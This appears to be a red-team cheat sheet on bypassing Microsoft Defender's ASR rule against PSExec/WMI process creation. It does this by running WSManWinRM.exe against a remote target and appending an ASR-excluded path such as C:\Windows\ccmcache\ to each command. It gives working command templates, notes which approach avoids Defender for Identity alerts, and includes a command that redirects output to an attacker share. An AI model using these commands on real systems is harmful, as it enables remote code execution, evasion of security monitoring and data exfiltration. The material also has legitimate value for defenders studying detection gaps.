# ASR Rules Bypass (WSManWinRM)

Bypass "Block process creations originating from PSExec and WMI commands" ASR rule using WSManWinRM with an ASR exclusion path.

## Normal WinRS (triggers MDI)
```
winrs -r:<TARGET_FQDN> cmd
```
WinRS works but triggers Microsoft Defender for Identity (MDI) alerts.

## WSManWinRM with ASR Exclusion Path
Append a path matching an ASR exclusion (e.g., `C:\Windows\ccmcache\`) to the command:
```
WSManWinRM.exe <TARGET_FQDN> "cmd /c <COMMAND> C:\Windows\ccmcache\"
```
The trailing path makes the process creation appear to originate from an ASR-excluded path.

## Example: Check Username
```
WSManWinRM.exe <TARGET_FQDN> "cmd /c set username C:\Windows\ccmcache\"
```

## Redirect Output to Share
```
WSManWinRM.exe <TARGET_FQDN> "cmd /c dir >> \\<ATTACKER_SHARE>\out.txt C:\Windows\ccmcache\"
```

## Notes
- Returns result code (not output) directly — redirect to share for output capture
- If result code = 0: command execution failed
- ASR exclusions: `C:\Windows\ccmcache\`, `C:\AD\Tools\` (if added), software deployment paths
- Effective against ASR rules targeting WMI/PSExec process creation
